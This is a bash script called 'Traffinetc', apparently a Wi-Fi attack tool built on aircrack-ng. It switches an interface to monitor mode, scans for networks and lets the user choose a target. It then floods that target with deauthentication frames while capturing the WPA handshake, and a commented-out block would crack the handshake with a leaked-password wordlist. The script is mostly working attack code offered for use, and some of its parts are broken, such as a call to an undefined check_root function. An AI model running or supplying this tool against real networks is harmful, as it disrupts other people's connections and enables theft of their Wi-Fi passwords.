resize -s 38 150 > /dev/null
bind 'TAB:menu-complete'


#
# colors
BLUE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BRIGHT_PURPLE='\033[1;35m'
NC='\033[0m' # No Color


os=$(uname)
homepath=$(echo ~)
user=$(who | cut -d ' ' -f1 | sort | uniq)
interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')

function banner () {
    echo -e "                                  
  Traffinetc v1.0
  @github/${BRIGHT_PURPLE}Weekeyv${NC}" 
}

function show_system_info() {
    # System information
    os=$(grep -E '^PRETTY_NAME=' /etc/os-release | cut -d= -f2 | tr -d '"')
    kernel=$(uname -r)
    uptime=$(uptime -p)
    hostname=$(hostname)

    interface=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | sed -n '2p')
    gum style \
        --margin "2 2" \
    "System Status Panel" \
    "" \
    "Operating System   $os" \
    "Kernel Version     $kernel" \
    "Hostname           $hostname" \
    "Uptime             $uptime" \
    "Interface          $interface"


}



function run_airodump() {
    local interface=$1
    gum style --bold "  Scanning for Wi-Fi networks on interface: $interface"
    gum style "  ATTENTION: Make sure when you press Ctrl + C you are in the xterm window, not your main terminal."
    gum style "  When finished scanning, press Ctrl + C"
    # Calculate position - adjust these if your screen or font size differs
    rm -f outputfile*.csv
    local screen_width=1920
    local xterm_cols=100
    local xterm_rows=50
    local cell_width=8
    local cell_height=4
    local x_offset=$((screen_width - xterm_cols * cell_width))
    local y_offset=0
    xterm -geometry ${xterm_cols}x${xterm_rows}+${x_offset}+${y_offset} -e "airodump-ng $interface --output-format csv -w outputfile"
}


function filter_info() {
    rm -rf "final_result.txt"
    local input_file="outputfile-01.csv"
    local output_file="ap_info.csv"
    awk -F ',' 'BEGIN {OFS=","} {if ($1 != "") print $1, $4, $14, $6, $7}' "$input_file" > "$output_file"
    gum style "  Filtered information saved in $output_file"
    cat "$output_file" | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
    rm -rf "outputfile-01.csv"
    rm -rf "ap_info.csv"

}


function sendDeauth () {
    local bssid=$1
    local interface=$2
    echo -e "${RED}"
    xterm -geometry 100x50 -e "aireplay-ng -0 10 -a $bssid $interface"
    echo -e "${NC}"

}



function choseTargetAp() {
    local input_file="final_result.txt"

    mapfile -t gum_choices < <(
        awk -F ", *" '
        {
            bssid = $1
            ssid = ($3 == "" ? "No Name" : $3)
            encryption = ($4 == "" ? "Unknown" : $4)
            channel = ($2 == "" ? "?" : $2)
            printf("%s %-20s %-10s %s\n", bssid, ssid, encryption, channel)
        }' "$input_file"
    )

    echo

    target_line=$(printf "%s\n" "${gum_choices[@]}" | gum choose --header="  choose a target Wi-Fi network")
    selected=$(echo "$target_line" | cut -d '|' -f1 | xargs)
    bssid=$(echo "$selected" | awk '{print $1}')
    channel=$(echo "$selected" | awk '{print $4}')
    gum style --bold "  selected Target         {$bssid}"
    gum style --bold "  selected Target channel {$channel}"
    
    startAttacking $bssid $channel
}

function startAttacking() {
    local targetBSSID=$1
    local targetChannel=$2



    if [ ! -f "$hand_shake" ] && [ ! -s "$hand_shake" ]; then
        echo "  error: File '$hand_shake' does not exist or is empty!"
    else
        aircrack_start "$handshake_file" "$targetBSSID"  
        exit 1
    fi




    gum style --foreground 212 "  starting handshake capture process..."
    gum input --placeholder " press Enter to begin..." >/dev/null
    getHandshake "$targetBSSID" "$targetChannel"



    # aircrack_start "$handshake_file" "$targetBSSID"  
}

function getHandshake () {

    local bssid=$1
    local channel=$2
    local interfaceLocal=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
    local currentPath=$(pwd)

    cd $currentPath/handshake

    sendDeauth "$bssid" "$interfaceLocal" &
    xterm -geometry 100x50 -e "airodump-ng -c $channel --bssid $bssid -w psk $interfaceLocal"

    aircrack_start $currentPath/handshake/psk-01.cap $bssid
}

function aircrack_start() {

    echo "were done over here !"
    # local capfile=$1
    # local you_word_list_path= 
    # local bssid=$2
    # local path_wordlist="/home/dvsys/Desktop/seclist/Passwords/Leaked-Databases/all-shit.txt"
    # aircrack-ng -w "$path_wordlist" -b "$bssid" "$capfile" 2>&1



}



function check_monitor_mode_support() {

    attack_kind=("Deauthentication attack" "Wps / wps2 crack" "Get handshake file")
    current_attack=$(printf "%s\n" "${attack_kind[@]}" | gum choose --header="  Choose Attack Type")
    
    interfaces=$(iw dev | awk '$1=="Interface"{print $2}')
    interface_result=$(echo "$interfaces" | gum choose --header="  choose which monitor")


    if [[ -z "$interfaces" ]]; then
        echo "No interface selected. Exiting."
        exit 1
    fi




    choice=$(echo -e "Yes\nNo" | gum choose --height=2 --header="  switch ($interface_result) to monitor mode?")
    if [[ "$choice" == "Yes" ]]; then
        echo -e "  $interface_result switched to monitor mode!"
        airmon-ng start "$interface_result" > /dev/null
    else
        echo -e "Sorry, we cannot run this script without Monitor mode!"
        exit 1
    fi
}





function checkRoot () { 
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!]${NC} We need root permition !"
        echo -e "${YELLOW}[+]${NC} Try run with [ sudo su ] "
    else 
        clear
        banner
        check_monitor_mode_support
    fi
} 


# function checkTools() {
#     gum style --bold "Checking required tools..."
#     echo ""
#     tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
#     tools_found=0
#     missing_tools=()
#     for tool in "${tools[@]}"; do
#         sleep 0.2
#         if ! command -v "$tool" &> /dev/null; then
#             gum style "   $tool    not found"
#             missing_tools+=("$tool")
#         else
#             gum style --foreground=212 "found    $tool"
#             ((tools_found++))
#         fi
#     done
#     echo
#     if [ "$tools_found" -eq "${#tools[@]}" ]; then
#         gum style --bold "All tools found. Proceeding..."
#     else
#         gum style --bold "Some tools are missing:"
#         for tool in "${missing_tools[@]}"; do
#             gum style "Try installing with: sudo apt-get install $tool"
#         done
#         exit 1
#     fi
# }



function main () {
    check_root
    clear 
    banner
    show_system_info

    check_monitor_mode_support
    run_airodump "$interface_result"
    filter_info
    choseTargetAp

}







main 


